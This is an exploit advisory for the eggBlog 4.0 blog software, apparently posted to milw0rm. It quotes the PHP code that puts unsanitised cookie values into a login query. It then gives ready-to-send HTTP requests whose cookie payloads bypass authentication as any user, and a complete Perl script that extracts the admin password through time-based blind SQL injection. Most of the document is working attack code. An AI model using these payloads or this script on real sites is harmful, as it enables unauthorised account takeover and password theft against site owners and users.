# Author:	__GiReX__
# mySite:	girex.altervista.org
# Date:		27/03/2008 - 1/04/2008 Added exploit for str0ke 

# CMS: 		eggBlog 4.0
# Site:		eggblog.net

# Bug: 		SQL Injection (cookie vars)
# Type:	        1 - Admin/User Authentication Bypass

# Bug2:		Blind SQL Injection (same vars-query)
# Type:		Password retrieve exploit

# Var :		$_COOKIE['email], $_COOKIE['password']
# Need:		magic_quotes_gpc = Off

# File: index.php
	require_once "_lib/global.php";
	...
	eb_pre();

# File: /_lib/globals.php
	require_once '_lib/user.php';
	...
	function eb_pre() {
	...
	if(isset($_COOKIE['email']) && isset($_COOKIE['password']) && !isset($_SESSION['user_id'])) eb_login($_COOKIE['email'],$_COOKIE['password'],1);

# Let we see function eb_login

# File: /_lib/user.php
	function eb_login($email,$password,$key) {
	...
	if($key==0) $password=md5($password);

# Our $key is set to 1 so the password will not cprypted

	$sql="SELECT user_id FROM eb_users WHERE user_email=\"".$email."\" AND   md5(user_password)=\"".$password."\"";
	$query=mysql_query($sql);

# I have no words, 2 vars not sanizated into a SELECT query

PoC 1:
	GET [PATH]/index.php HTTP/1.1
	Host: [HOST]
	...
	Cookie: email=@" OR "1; password=@" OR "1

# With this you will be authenticated with the fist record of table eb_user

PoC 2:
	GET [PATH]/index.php HTTP/1.1
	Host: [HOST]
	...
	Cookie: email=@" OR "1; password=@" OR "1" AND user_id="[VICTIM_USER_ID]

# For anybody you want

##############################################################################################################
# Start Blind SQL Injection / Password retrieve exploit							     #
# NOTE:	Password is in plain-text so take  a coffe...							     #
##############################################################################################################
#!/usr/bin/perl -w

# EggBlog v4.0 Blind SQL Injection
# Password Retrieve Exploit
# Coded by __GiReX__

use LWP::UserAgent;
use HTTP::Request;

if(not defined $ARGV[0])
{
	print "usage: perl $0 [host] [path]\n";
	print "example: perl $0 localhost /eggblog/\n";
	exit;
}

my $client = new LWP::UserAgent;
my @cset = (32..126, 0); 
my ($i, $j, $hash) = (0, 1, undef);
 
my $host = ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0]:  'http://' . $ARGV[0];
   $host .= $ARGV[1] unless not defined $ARGV[1];

banner();
check_vuln($host) or die "[-] Site not vulnerable\n";


while($i != $#cset)
{  
   for($i = 0; $i <= $#cset; $i++)
   {
      my ($pre_time, $post_time) = time();	
	
	$rv = check_char($host, $cset[$i], $j);
	$post_time = time();	
	
	 info(chr($cset[$i]), $post_time - $pre_time, $hash);
	
	 if($post_time - $pre_time > 3 and $rv)
	 {
		$hash .= chr($cset[$i]); 
		last;
	 }
   }

  $j++;
}

print "\n". (defined $hash) ?
      "[+] Admin password: ${hash} \n":
      "[-] Exploit mistake: please check benchmark and charset\n";

print "[+] Exploit terminated\n\n";



sub banner
{
   print "\n";
   print "[+] EggBlog v4.0 Blind SQL Injection\n";
   print "[+] Password Retrieve Exploit\n";
   print "[+] Coded by __GiReX__\n";
   print "\n";
}

sub check_vuln
{
  my ($target, $res) = @_;
     
     $get = new HTTP::Request(GET, $target);
     $get->header('Cookie' => 'email=-1" WHERE X#; password=aaaaaaa;');
     $res = $client->request($get);
     
       if($res->is_success) 
       {
	  return 1 if $res->content =~ /<b>Warning<\/b>:/;
       }
  
  return 0;
}

sub check_char
{
  my ($target, $char, $n, $res) = @_;
   
    $get->header(Cookie => 
			'email=-1"+AND+'.
			'CASE+WHEN'.
			'((SELECT(ASCII(SUBSTRING(user_password,'.$n.',1)))FROM+eb_users+WHERE+user_id=1)='.$char.')'.
			'THEN+benchmark(90000000,CHAR(0))+'.
			'END#; '.
			'password=dummy_psw'); 

    $res = $client->request($get);
 
return $res->is_success;
}

sub info
{
  my ($char, $delay, $hash) = @_;
    print STDOUT "[+] Admin password: ${hash}".$char."\r" unless not defined $hash;
    # print STDOUT "[+] Char: ${char} - Delay: ${delay}\r";
    $| = 1;
}

# milw0rm.com [2008-04-01]
